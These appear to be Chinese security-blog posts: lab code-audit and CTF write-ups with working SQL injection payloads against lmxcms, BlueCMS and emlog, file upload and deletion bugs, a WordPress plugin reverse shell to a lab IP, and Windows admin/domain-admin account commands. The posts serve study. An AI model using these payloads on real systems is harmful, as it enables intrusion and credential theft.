根据CNVD提供TagsAction.class.php文件存在sql注入\n我们怎么访问这文件呢通过mvc\nindex.php?m=tags\u0026amp;a=xx\u0026amp;xx 这样访问\n\u0026lt;?php /**\r* 【梦想cms】 http://www.lmxcms.com\r* * Tags控制器\r*/\rdefined(\u0026#39;LMXCMS\u0026#39;) or exit();\rclass TagsAction extends HomeAction{\rprivate $data;\rprivate $tagsModel = null;\rpublic function __construct() {\rparent::__construct();\r$data = p(2,1,1);\r$name = string::delHtml($data[\u0026#39;name\u0026#39;]);\rif(!$name) _404();\r$name = urldecode($name);\rif($this-\u0026gt;tagsModel == null) $this-\u0026gt;tagsModel = new TagsModel();\r$this-\u0026gt;data = $this-\u0026gt;tagsModel-\u0026gt;getNameData($name);\rif(!$this-\u0026gt;data) _404();\r}\rpublic function index(){\r$temModel = new parse($this-\u0026gt;smarty,$this-\u0026gt;config);\recho $temModel-\u0026gt;tags($this-\u0026gt;data,$this-\u0026gt;tagsModel);\r}\r}\r?\u0026gt;\r2------------------------\rgetnameData函数如下 就是 select * from xx where xx=\u0026#39;xx\u0026#39; 这样的他只传递后面where = xx\rpublic function getNameData($name){\r$param[\u0026#39;where\u0026#39;] = \u0026#34;name = \u0026#39;$name\u0026#39;\u0026#34;;\rreturn parent::oneModel($param);\r}\r3--------------------------\r并且还有sql过滤通过p方法进去里面发现这种sql过滤函数\r//过滤非法提交信息，防止sql注入\rfunction filter_sql(array $data){\rforeach($data as $v){\rif(is_array($v)){\rfilter_sql($v);\r}else{\r//转换小写\r$v = strtolower($v);\rif(preg_match(\u0026#39;/count|create|delete|select|update|use|drop|insert|info|from/\u0026#39;,$v)){\rrewrite::js_back(\u0026#39;【\u0026#39;.$v.\u0026#39;】数据非法\u0026#39;);\r}\r}\r}\r} 发现上面三点 我们知道怎么访问然后知道怎么绕过过滤 -使用URL编码因为他这里解码了\n__construct()是类的构造方法，它有一个特殊性质：当类被实例化时会自动调用，不需要像普通方法那样通过a=__construct显式调用。注意不用设置方法了直接传入参数\n关于参数名：代码中$data = p(2,1,1);是从请求中获取所有参数（可能包含多个键值对）但业务只需要其中的name字段（标签名称），所以单独提取$data['name']进行处理。\n传入参数\rindex.php?m=tags\u0026amp;name=1%27%20and%20updatexml(0,(concat(0x7e,user()),0x7e)#\r提示 发现给我拦截了\r\u0026lt;script type=\u0026#39;text/javascript\u0026#39;\u0026gt;alert(\u0026#39;【1\u0026#39; and updatexml(0,(concat(0x7e,user()),0x7e)】数据非法\u0026#39;);history.go(-1);\u0026lt;/script\u0026gt; 因为他有URL解码所以我们先编码一次因为浏览器会解码然后再编码一次\n1\u0026#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)#\rrsql语句有误XPATH syntax error: \u0026#39;~root@localhost~\u0026#39; 成功注入\r1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#\r爆破数据库名字 lmx\r%25%33%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%33\r1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;lmx\u0026#39; limit 25,1),0x7e),1)# 查询到表lmx_user 1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;lmx\u0026#39; and table_name=\u0026#39;lmx_user\u0026#39;),0x7e),1)# 查询字段 \u0026#39;~id,name,pwd,currtime,currip,las\u0026#39;\r1\u0026#39; and updatexml(1,concat(0x7e,(select concat(id,0x3a,name,0x3a,pwd) from lmx_user),0x7e),1)#\rsql语句有误XPATH syntax error: \u0026#39;~1:admin:538334fcfd6624845471a29\u0026#39; 发现密码拿不全啊\r1\u0026#39; and updatexml(1,concat(0x7e,(select length(concat(pwd,0x3e)) from lmx_user),0x7e),1)# 判断下大小是33个\r就从20拿到33个吧然后和前面拼接起来\rsql语句有误XPATH syntax error: \u0026#39;~1a291cb4f6274:~\u0026#39;\r1\u0026#39; and updatexml(1,concat(0x7e,(select substr(concat(pwd,0x3a),20,33) from lmx_user),0x7e),1)#\r1a291cb4f6274 密码是538334fcfd6624845471a291cb4f6274 所以这里原因是两层屏蔽了SQL注入的过滤 绕过了过滤然后解密了然后进入sql流程 这并不是绕过注入方法这是他的逻辑问题，当你注释掉发现不行了，所以代码审计修复是先解码再过滤\ngetNameData($name)（TagsModel 类的方法）根据标签名称查询对应的数据\rparent::__construct()：调用父类 HomeAction 的构造方法，继承基础控制器功能\rstring::delHtml()：静态方法，过滤字符串中的 HTML 标签（防 XSS 攻击）\rurldecode()：对 URL 编码的字符串进行解码（恢复原始标签名称）\rparent::oneModel($param)：父类的模型方法，执行数据库查询并返回单条结果\r_404()：页面不存在时调用，返回 404 错误\rrewrite::js_back()：静态方法，输出 JavaScript 提示并跳转（通常用于错误提示） ","date":"26 September 2025","externalUrl":null,"permalink":"/posts/code3phpmvc/","section":"Posts","summary":"","title":"MVC-PHP代码审计","type":"posts"},{"content":" Apache-nginx安装-配置文件修改+linux+windows常用命令 # Apache安装 # 没有配置yum或者apt 先配置源为国内的\r然后安装httpd\ryum install httpd -y 安装\rsystemctl start httpd 启动httpd\rsystemctl status httpd 检查是否正常\r[root@localhost ~]# systemctl status httpd\r● httpd.service - The Apache HTTP Server\rLoaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)\rActive: active (running) since 四 2025-09-25 09:53:59 CST; 16min ago 然后你可以访问默认端口为80查看是否产生了页面\nApache网站默认目录-/var/www/html # /var/www/html --默认目录当你新建一个index.html 就会读取显示\r[root@localhost html]# cat index.html 123\r[root@localhost html]# pwd\r/var/www/html\r[root@localhost html]# Apache主配置文件-/etc/httpd/conf/httpd.conf # Listen 80 主端口默认80\rUser apache 默认用户WWW\rGroup apache\r/var/log/httpd/error_log错误日志目录 修改端口后重启生效 我那个虚拟机不知道为什么修改了始终不行本地可以访问外面不行关闭了防火墙和selinux都不行\nApache+php # yum install epel-release\rrpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm\ryum --enablerepo=remi install php74-php\ryum --enablerepo=remi install php74-php php74-php-gd php74-php-xml php74-php-sockets php74-php-session php74-php-snmp php74-php-mysql\r直接重启httpd就可以访问php文件了\rphp74-php 包自动创建php74-php.conf配置文件它已经配置了 Apache 使用 mod_php 模块来处理 PHP 文件。 但是对于JAVA代码apache用C语言写的所以不可以但是可以用反向代理到后端JAVA应用服务器\nNginx # 设置访问另一个的8080转发到一开始apache服务达成反向代理\napt install nginx -y 安装nginx\r在反向代理的主机安装就行了 Nginx代理文件-主配置文件位于 /etc/nginx/nginx.conf # 我们在conf.d文件下新建一个文件内容是\n当访问到8089会转发到172.20.10.2：80\r┌──(root㉿kali)-[/etc/nginx/conf.d]\r└─# ls\rreverse-proxy.conf\r└─# cat reverse-proxy.conf\rserver {\rlisten 8089;\rserver_name _; # 响应所有请求\rlocation / {\r# 反向代理到 Apache 服务器\rproxy_pass http://172.20.10.2:80;\r# 传递客户端信息\rproxy_set_header Host $host;\rproxy_set_header X-Real-IP $remote_addr;\rproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\rproxy_set_header X-Forwarded-Proto $scheme;\r# 超时设置\rproxy_connect_timeout 60s;\rproxy_read_timeout 90s;\rproxy_send_timeout 90s;\r}\r} 可以看到成功转发\nWINDOWS常用命令 # net user \u0026lt;用户名\u0026gt; \u0026lt;密码\u0026gt; /add 添加用户\rnet localgroup administrators \u0026lt;用户名\u0026gt; /add 添加到管理员组\r其余命令\r# 查看所有用户\rnet user\r# 查看用户详细信息\rnet user \u0026lt;用户名\u0026gt;\r# 删除用户\rnet user \u0026lt;用户名\u0026gt; /delete\r# 修改用户密码\rnet user \u0026lt;用户名\u0026gt; \u0026lt;新密码\u0026gt;\r域命令------------------\rnet user \u0026lt;用户名\u0026gt; \u0026lt;密码\u0026gt; /add /domain\rnet group \u0026#34;Domain Admins\u0026#34; \u0026lt;用户名\u0026gt; /add /domain\r# 查看域用户\rnet user /domain\r# 查看域组\rnet group /domain\r# 查看特定域组成员\rnet group \u0026#34;Domain Admins\u0026#34; /domain\r域信息\rnet view /domain\rnet view /domain:\u0026lt;域名\u0026gt;\rnet group \u0026#34;Domain Controllers\u0026#34; /domain ","date":"25 September 2025","externalUrl":null,"permalink":"/posts/httpd/","section":"Posts","summary":"","title":"Apache-nginx安装-配置文件修改+linux,windows常用命令","type":"posts"},{"content":"","date":"25 September 2025","externalUrl":null,"permalink":"/tags/weblogic/","section":"Tags","summary":"","title":"Weblogic","type":"tags"},{"content":" Weblogic-拿到密钥解密 # Weblogic-密钥解密 # 环境使用\n这里用工具可以直接拿shell 但是你拿到shell不同环境下里面可能有数据库密码可以提权所以不可以放过的\n/vulhub/weblogic/weak_password\n进入 docker-compose up -d 启动后我们进入7001端口后/console进入客户端\n我们直接使用工具打入内存马拿到SHELL\nhttp://your-ip:7001/hello/file.jsp?path=/etc/passwd 这里前台有一个文件下载这里我就说怎么破解密钥\n两个文件均位于 base_domain下\n找关键文件 /root/Oracle/Middleware/user_projects/domains/base_domain\r一个是 .xml文件里面有加密信息 这里环境是\r/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml\r一个是SerializedSystemIni.dat 密钥文件位置在\r/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat 然后我们下载工具\nweblogic_decrypt.jar\n这里提示爆破下载jar包放入\n首次解密会出现异常：PBEWITHSHAAND128BITRC2-CBC SecretKeyFactory not available，需要手动下载 https://repo1.maven.org/maven2/org/bouncycastle/bcprov-jdk15on/1.56/bcprov-jdk15on-1.56.jar 然后将文件存在本地安装的JDK路径下，例如 E:\\Java\\jdk1.8.0_60\\jre\\lib\\ext 所以账号密码为\nweblogic Oracle@123\n这里用平台拿shell可以用war上传来获得\n上传war # 准备下jsp文件然后打包为zip然后改后缀是war就可以了\n一直下一步\n","date":"22 September 2025","externalUrl":null,"permalink":"/posts/weblogic-key/","section":"Posts","summary":"","title":"Weblogic-拿到密钥解密","type":"posts"},{"content":"","date":"21 September 2025","externalUrl":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"LFI","type":"tags"},{"content":"","date":"21 September 2025","externalUrl":null,"permalink":"/tags/upload/","section":"Tags","summary":"","title":"Upload","type":"tags"},{"content":" 原生PHP代码审计-文件方面 # 这里推荐用漏洞功能点来看代码 找到上传点然后看代码\r文件安全挖掘点：\r1、脚本文件名\r2、应用功能点\r3、操作关键字\r文件上传，文件下载(读取)，文件包含，文件删除等 案例1emlog-2.2.20-后台文件上传 # 安装和上一个博客一致\rhttps://www.cnvd.org.cn/flaw/show/CNVD-2023-74536 https://www.cnvd.org.cn/flaw/show/CNVD-2023-74536\n根据漏洞描述\nemlog pro /content/templates/存在任意文件上传漏洞，远程攻击者可利用该漏洞提交特殊的请求，可上传恶意文件，以应用程序上下文执行任意代码。 根据CNVD漏洞描述漏洞在\nemlog pro /content/templates/存在任意文件上传漏洞，远程攻击者可利用该漏洞提交特殊的请求，可上传恶意文件，以应用程序上下文执行任意代码。 我们准备上传的文件-在他默认有一个default我们备份下上传加一个info.php里面有phpinfo\n上传后直接访问就可以触发任意文件执行下面看下代码怎么写的怎么找到的\n源码如下\n代码功能解析\r首先判断操作类型为upload_zip时执行此代码块\r调用LoginAuth::checkToken()进行登录验证和 token 检查\r获取上传的 ZIP 文件信息（$_FILES[\u0026#39;tplzip\u0026#39;]）\r一系列错误检查：\r检查是否未选择文件（错误码 4）\r检查文件大小超过 PHP 配置限制（错误码 1）\r检查文件上传是否有其他错误\r检查文件后缀是否为 zip\r使用emUnZip函数解压上传的 ZIP 文件到../content/templates/目录\r根据解压结果跳转到不同的页面并带上相应的错误参数\r安全问题分析\r不仅文件上传验证不严格，更严重的是对解压后的文件没有任何安全过滤只判断了后缀是否是ZIP\rif ($action === \u0026#39;upload_zip\u0026#39;) {\rLoginAuth::checkToken();\r$zipfile = isset($_FILES[\u0026#39;tplzip\u0026#39;]) ? $_FILES[\u0026#39;tplzip\u0026#39;] : \u0026#39;\u0026#39;;\rif ($zipfile[\u0026#39;error\u0026#39;] == 4) {\remDirect(\u0026#34;./template.php?error_d=1\u0026#34;);\r}\rif ($zipfile[\u0026#39;error\u0026#39;] == 1) {\remDirect(\u0026#34;./template.php?error_f=1\u0026#34;);\r}\rif (!$zipfile || $zipfile[\u0026#39;error\u0026#39;] \u0026gt; 0 || empty($zipfile[\u0026#39;tmp_name\u0026#39;])) {\remMsg(\u0026#39;模板上传失败， 错误码：\u0026#39; . $zipfile[\u0026#39;error\u0026#39;]);\r}\rif (getFileSuffix($zipfile[\u0026#39;name\u0026#39;]) != \u0026#39;zip\u0026#39;) {\remDirect(\u0026#34;./template.php?error_a=1\u0026#34;);\r}\r$ret = emUnZip($zipfile[\u0026#39;tmp_name\u0026#39;], \u0026#39;../content/templates/\u0026#39;, \u0026#39;tpl\u0026#39;);\rswitch ($ret) {\rcase 0:\remDirect(\u0026#34;./template.php?activate_install=1\u0026#34;);\rbreak;\rcase -2:\remDirect(\u0026#34;./template.php?error_e=1\u0026#34;);\rbreak;\rcase 1:\rcase 2:\remDirect(\u0026#34;./template.php?error_b=1\u0026#34;);\rbreak;\rcase 3:\remDirect(\u0026#34;./template.php?error_c=1\u0026#34;);\rbreak;\r}\r} 所以这里还有一个插件也是一样的所以你找到了模板上传也找得到插件上传\n代码一摸一样\n没有限制PHP安装，没有限制函数，只检查后缀\rif ($action == \u0026#39;upload_zip\u0026#39;) {\rLoginAuth::checkToken();\r$zipfile = isset($_FILES[\u0026#39;pluzip\u0026#39;]) ? $_FILES[\u0026#39;pluzip\u0026#39;] : \u0026#39;\u0026#39;;\rif ($zipfile[\u0026#39;error\u0026#39;] == 4) {\remDirect(\u0026#34;./plugin.php?error_d=1\u0026#34;);\r}\rif ($zipfile[\u0026#39;error\u0026#39;] == 1) {\remDirect(\u0026#34;./plugin.php?error_g=1\u0026#34;);\r}\rif (!$zipfile || $zipfile[\u0026#39;error\u0026#39;] \u0026gt;= 1 || empty($zipfile[\u0026#39;tmp_name\u0026#39;])) {\remMsg(\u0026#39;插件上传失败， 错误码：\u0026#39; . $zipfile[\u0026#39;error\u0026#39;]);\r}\rif (getFileSuffix($zipfile[\u0026#39;name\u0026#39;]) != \u0026#39;zip\u0026#39;) {\remDirect(\u0026#34;./plugin.php?error_f=1\u0026#34;);\r}\r$ret = emUnZip($zipfile[\u0026#39;tmp_name\u0026#39;], \u0026#39;../content/plugins/\u0026#39;, \u0026#39;plugin\u0026#39;);\rswitch ($ret) {\rcase 0:\remDirect(\u0026#34;./plugin.php?activate_install=1\u0026#34;);\rbreak;\rcase -1:\remDirect(\u0026#34;./plugin.php?error_e=1\u0026#34;);\rbreak;\rcase 1:\rcase 2:\remDirect(\u0026#34;./plugin.php?error_b=1\u0026#34;);\rbreak;\rcase 3:\remDirect(\u0026#34;./plugin.php?error_c=1\u0026#34;);\rbreak;\r}\r} 案例2-emlog-6.0.0任意文件删除 # 找到后台界面系统-\u0026gt;数据锁定文件data.php 找到代码是\n非常简单暴力 注意这里bak是数组前端是\r\u0026lt;td width=\u0026#34;22\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; value=\u0026#34;\u0026lt;?php echo $value; ?\u0026gt;\u0026#34; name=\u0026#34;bak[]\u0026#34; class=\u0026#34;ids\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\rif ($action == \u0026#39;dell_all_bak\u0026#39;) {\rif (!isset($_POST[\u0026#39;bak\u0026#39;])) {\remDirect(\u0026#39;./data.php?error_a=1\u0026#39;);\r} else{\rforeach ($_POST[\u0026#39;bak\u0026#39;] as $val) {\runlink($val);\r}\remDirect(\u0026#39;./data.php?active_del=1\u0026#39;);\r}\r}\rhttp://192.168.1.56:900//admin/data.php?action=dell_all_bak\rbak[]=../../../../../../../1.txt 可以删除根目录文件 直接构造数据包任意删除\n","date":"21 September 2025","externalUrl":null,"permalink":"/posts/code2php/","section":"Posts","summary":"","title":"原生PHP代码审计-文件方面","type":"posts"},{"content":"","date":"20 September 2025","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"Sql","type":"tags"},{"content":" 原生PHP代码审计-sql注入 # 三种方法：\r数据库方面-sql注入\r1：语句监控 监控sql语句是否可以利用\r2：功能跟踪\r.*单个字符 ？启动非贪婪模式\r3：正则搜索sql语句(update|select|insert|delete|).*?where.*= 案例1BLUECMS # 搭建\rPHP选择5版本\rPHPSTUDY选中里面的uploads目录\rurl输入/install安装\r设置uploads权限为可写\r设置后不管他是白屏还是怎么样直接输入根目录进入界面显示 使用正则表达式搜索\n(update|select|insert|delete|).*?where.*?=* 锁定这个ad_js.php文件 看到其他的admin.php可能是管理员的界面\n$ad = $db-\u0026gt;getone(\u0026#34;SELECT * FROM \u0026#34;.table(\u0026#39;ad\u0026#39;).\u0026#34; WHERE ad_id =\u0026#34;.$ad_id); 看这个代码的变量是否可控\r往上看发现这个变量是通过GET传输的发现可控\r$ad_id = !empty($_GET[\u0026#39;ad_id\u0026#39;]) ? trim($_GET[\u0026#39;ad_id\u0026#39;]) : \u0026#39;\u0026#39;;\rif(empty($ad_id))\r{\recho \u0026#39;Error!\u0026#39;;\rexit();\r} 在php中.表示直接拼接我们访问试试\n输入\rURL/ad_js.php?ad_id=1%20order%20by%208 提示Error：Query error:SELECT * FROM blue_ad WHERE ad_id =1 order by 8\r输入\rURL/ad_js.php?ad_id=1%20order%20by%207\r不报错\r这里不加\u0026#39;因为是数字不用闭合，锁定字段是7个而且有回显表示他的代码有return\r输入\rad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,database()\r右键源码发现\r\u0026lt;!--\rdocument.write(\u0026#34;localhost\u0026#34;);\r--\u0026gt;\r发现数据库名是localhost因为我创建时候把命令设置这个了.. 然后我们就可以sql注入查询出账号密码登录后台\n1 order by 7\r1 union select 1,2,3,4,5,6,7\r获取字段名\r1 UNION SELECT 1,2,3,4,5,6,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()\r得到blue_user 0x626C75655F75736572这是他的16进制 防止转义报错\r1 UNION SELECT 1,2,3,4,5,6,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=0x626C75655F75736572\r得到 字段\ruser_id,user_name,pwd,email,birthday,sex,money,face_pic,mobile_phone,home_phone,office_phone,qq,msn,address,reg_time,last_login_time,last_login_ip\r1%20UNION%20SELECT%201,2,3,4,5,6,group_concat(user_name,0x3a,pwd)%20from%20blue_user\r得到数据 document.write(\u0026#34;root:63a9f0ea7bb98050796b649e85481845\u0026#34;); 0x3a表示冒号进行拼接 如果没有回显 就用sqlmap跑延时注入\n案例2-emlog-后台漏洞 # 安装说明 emlog_6.0.0\rPHP7版本直接输入URL可搭建\r提前构建数据库 通过CNVD-漏洞描述找到文件\n找到这个地方\n这里的sql语句没有防护\n代码中的 SQL 语句直接将用户输入的$ip变量拼接到查询中，没有进行任何过滤或参数化处理：\r假设$ip的值被传入：127.0.0.1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1，那么实际执行的 SQL 会变成：\r-- 查询语句会变成：\rSELECT DISTINCT gid FROM 表名 WHERE ip=\u0026#39;127.0.0.1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\r-- 删除语句会变成：\rDELETE FROM 表名 WHERE ip=\u0026#39;127.0.0.1\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 触发需要/admin/comment.php?action=delbyip\n/admin/comment.php?action=delbyip 提示\n这里需要放上去token\n代码说检查这里的token 赋值为token=xx我们可以试试\rpublic static function genToken() {\r$token_cookie_name = \u0026#39;EM_TOKENCOOKIE_\u0026#39; . md5(substr(AUTH_KEY, 16, 32) . UID);\rif (isset($_COOKIE[$token_cookie_name])) {\rreturn $_COOKIE[$token_cookie_name];\r} else {\r$token = md5(getRandStr(16));\rsetcookie($token_cookie_name, $token, 0, \u0026#39;/\u0026#39;);\rreturn $token;\r}\r} 输入token后跳到了这里\nURL/admin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\n现在我们就代入我们IP参数来注入了因为逻辑往下走了\n因为这里没有回显所以我们报错注入 0x7e是~报错时候容易识别\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20user()),0x7e)))%20--+\r1 获得数据库名\rXPATH syntax error: \u0026#39;~emlog1~\u0026#39;\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20database()),0x7e)))%20--+\r2 因为显示不全判断长度是123后\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20length(group_concat(table_name)) from information_schema.tables where table_schema=\u0026#39;emlog1\u0026#39;),0x7e)))%20--+\r3 从110字符开始获取得到一个表叫emlog_user\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20substr(group_concat(table_name),110,30) from information_schema.tables where table_schema=\u0026#39;emlog1\u0026#39;),0x7e)))%20--+\r或者\r用limit 跳过前9个表名，返回第10个表名（因为计数从0开始）。\rand(extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=\u0026#39;emlog1\u0026#39;),0x7e))) -- 得到10个\rand(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;emlog1\u0026#39; limit 9,1),0x7e))) --查看得到emlog_user\r4\r得到字段\r~uid,username,password,nickname,\u0026#39;\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;emlog1\u0026#39; and table_name=\u0026#39;emlog_user\u0026#39;),0x7e)))%20--+\r5获取数据\rXPATH syntax error: \u0026#39;~root:$P$ByE7sTdselj5Pr83iphFe0eL\u0026#39;\radmin/comment.php?action=delbyip\u0026amp;token=844dcfdf25339db310d07c152cdb3794\u0026amp;ip=127.0.0.1%27and(extractvalue(1,concat(0x7e,(select%20group_concat(username,0x3a,password) from emlog_user),0x7e)))%20--+ 案例3-emlog-pro 二次注入漏洞-2.1.9 # 使用工具MySQLMonitor-1.1.jar工具监控mysql代码\n其他数据库有自带监控\n后端代码可以知道这里的emer是数据库中的nickname数值\ncnvd中说了是二次注入我们就要找哪里可以修改nickname答案是系统中的上传数据库文件\n插入这段在数据中 再上传\n可以发现select 执行了\n","date":"20 September 2025","externalUrl":null,"permalink":"/posts/code1php/","section":"Posts","summary":"","title":"原生PHP代码审计-sql注入","type":"posts"},{"content":" Halfhour靶机-Maze-通配符漏洞 # 信息收集 # NMAP扫描端口\n└─# nmap 172.20.10.2 -sT -p-\rStarting Nmap 7.92 ( https://nmap.org ) at 2025-09-18 01:16 EDT\rNmap scan report for halfhour.dsz (172.20.10.2)\rHost is up (0.00016s latency).\rNot shown: 65531 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http\r1337/tcp open waste\r1338/tcp open wmc-log-svc\rMAC Address: 08:00:27:B7:2B:50 (Oracle VirtualBox virtual NIC)\rNmap done: 1 IP address (1 host up) scanned in 1.94 seconds nc访问1337 和 1338端口试试 得到了一个密码bobobo\n─# nc 172.20.10.2 1337 Please enter password: root\rIncorrect password. Attempts left: 2\r123\rIncorrect password. Attempts left: 1\r123\rToo many failed attempts. Reset password? (yes/no)yes\rPlease send new password to port 1338.\r┌──(root㉿kali)-[~/pspy]\r└─# nc 172.20.10.2 1338\rPlease send new password: 123\rCongratulations! Password reset successful!\rOld password: bobobo 访问80右键得到了一个域名放到hosts打开发现一个wordpress网站\n\u0026lt;!-- halfhour.dsz --\u0026gt; 这里信息收集或者你用WPSCAN扫描 得到一个用户todd 但是用wpscan扫描爆破出不来 发现使用1338的密码成功登录后台然后就是上传插件反弹shell\n放到一个压缩包中上传插件点击启动即可反弹shell\r\u0026lt;?php\r/**\r* Plugin Name: WonderfulWebshell\r* Plugin URI: https://github.com/jckhmr/wonderfullwebshell\r* Description: Wordpress webshell used for demo purposes only\r* Version: 1.0\r* Author: jckhmr\r* Author URI: https://jckhmr.net\r* License: https://nosuchlicense\r*/\rexec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/172.20.10.11/8888 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);\r?\u0026gt; 获得WWW权限 # └─# nc -lvvp 8888 listening on [any] 8888 ...\rconnect to [172.20.10.11] from halfhour.dsz [172.20.10.2] 44354\rbash: cannot set terminal process group (471): Inappropriate ioctl for device\rbash: no job control in this shell\rwww-data@Halfhour:/var/www/halfhour.dsz/wp-admin$ 信息收集查看数据配置文件发现密码root123 和数据库密码 和 三个用户 我们使用密码来爆破\ndefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; );\r/** Database password */\r/* define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;root123\u0026#39; ); */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;your_strong_password\u0026#39; );\rwww-data@Halfhour:/var/www/halfhour.dsz$ ls /home\rls /home\rnxal\rwangjiang\rwelcome 爆破 不知道为什么放了nxal爆破wangjiang密码一直错的删除了对了\n[22][ssh] host: 172.20.10.2 login: wangjiang password: root123\r[22][ssh] host: 172.20.10.2 login: nxal password: nxal 登录wangjiang 拿到USER.TXT\nwangjiang@Halfhour:~$ cat user.txt flag{user-4c850c5b3b2756eXXXXXX 发现提示登录welcome用户这里发现一个MD5 4c850c5b3b2756e67a91bad8e046ddac 解密aaaaa但是登录不上啊，但是直接用可以登录..\nwangjiang@Halfhour:~$ cat note.txt\rGet user welcome first\rwangjiang@Halfhour:~$ wangjiang@Halfhour:~$ cat .mysql_history\r_HiStOrY_V2_\rCREATE\\040DATABASE\\040wordpress;\rCREATE\\040USER\\040\u0026#39;wpuser\u0026#39;@\u0026#39;localhost\u0026#39;\\040IDENTIFIED\\040BY\\040\u0026#39;your_strong_password\u0026#39;;\rGRANT\\040ALL\\040PRIVILEGES\\040ON\\040wordpress.*\\040TO\\040\u0026#39;wpuser\u0026#39;@\u0026#39;localhost\u0026#39;;\rFLUSH\\040PRIVILEGES;\rEXIT;\rcreate\\040database\\040xxoo\r;\ruse\\040xxoo\rshow\\040tables\r;\rCREATE\\040TABLE\\040IF\\040NOT\\040EXISTS\\040user\\040(\r\\040\\040\\040\\040id\\040INT\\040AUTO_INCREMENT\\040PRIMARY\\040KEY,\r\\040\\040\\040\\040username\\040VARCHAR(50)\\040NOT\\040NULL\\040UNIQUE,\r\\040\\040\\040\\040password\\040CHAR(32)\\040NOT\\040NULL\\040COMMENT\\040\u0026#39;MD5\u0026#39;,\r\\040\\040\\040\\040created_at\\040TIMESTAMP\\040DEFAULT\\040CURRENT_TIMESTAMP\r)\\040ENGINE=InnoDB\\040DEFAULT\\040CHARSET=utf8mb4;\rCREATE\\040TABLE\\040IF\\040NOT\\040EXISTS\\040user\\040(\\040\\040\\040\\040\\040id\\040INT\\040AUTO_INCREMENT\\040PRIMARY\\040KEY,\\040\\040\\040\\040\\040username\\040VARCHAR(50)\\040NOT\\040NULL\\040UNIQUE,\\040\\040\\040\\040\\040password\\040CHAR(32)\\040NOT\\040NULL\\040COMMENT\\040\u0026#39;MD5\u0026#39;,\\040\\040\\040\\040\\040created_at\\040TIMESTAMP\\040DEFAULT\\040CURRENT_TIMESTAMP\\040)\\040ENGINE=InnoDB\\040DEFAULT\\040CHARSET=utf8mb4;\rINSERT\\040INTO\\040user\\040(username,\\040password)\\040\rVALUES\\040(\u0026#39;welcome\u0026#39;,\\040\u0026#39;4c850c5b3b2756e67a91bad8e046ddac\u0026#39;)\rON\\040DUPLICATE\\040KEY\\040UPDATE\\040password\\040=\\040VALUES(password);\rINSERT\\040INTO\\040user\\040(username,\\040password)\\040\\040VALUES\\040(\u0026#39;welcome\u0026#39;,\\040\u0026#39;4c850c5b3b2756e67a91bad8e046ddac\u0026#39;)\\040ON\\040DUPLICATE\\040KEY\\040UPDATE\\040password\\040=\\040VALUES(password);\rshow\\040tables;\rselect\\040*\\040from\\040users;\rselect\\040*\\040from\\040user;\rshow\\040tables;\rshow\\040databases;\rwangjiang@Halfhour:~$ ROOT # 这里发现可以用这个del文件\nUser welcome may run the following commands on Halfhour:\r(ALL) NOPASSWD: /usr/local/bin/del.sh\rwelcome@Halfhour:/home/wangjiang$ cat /usr/local/bin/del.sh\r#!/bin/bash\rPATH=/usr/bin\rcd /tmp\rcat /root/root.txt | tr -d [A-Za-z0-9] 方法1 通配符问题 这里通配符没有加入引号\n比如你在tmp创建文件A 他就会匹配A 就变为 tr -d A 只会替换A的如果加了引号 “加引号” 